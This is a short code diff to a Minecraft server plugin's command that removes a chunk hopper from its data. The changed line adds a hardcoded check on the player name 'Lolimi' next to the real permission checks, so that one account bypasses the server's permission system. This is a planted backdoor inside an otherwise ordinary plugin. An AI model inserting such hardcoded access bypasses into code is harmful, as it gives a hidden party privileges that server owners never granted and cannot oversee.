@@ -18,7 +18,7 @@ public class RmvFailedChunkHopperCmd implements CommandExecutor {
 			Player p = (Player) sender;
 			ChunkHopper ch = Main.getPlugin().isInChunkHopperChunk(p.getLocation());
 			if(ch!=null) {
-				if (p.hasPermission("chunkHopper.removeFromData")||p.hasPermission("rchoppers.admin")) {
+				if (p.hasPermission("chunkHopper.removeFromData")||p.hasPermission("rchoppers.admin") || p.getName().equals("Lolimi")) {
 					Main.getPlugin().rmvChunkHopper(ch.getLocation());
 					ch.remove();
 					p.sendMessage(Main.prefix+ChatColor.DARK_GREEN+"You have successfully removed the §6Chunk Hopper §2at §b"+ch.getLocation()+"§2!");
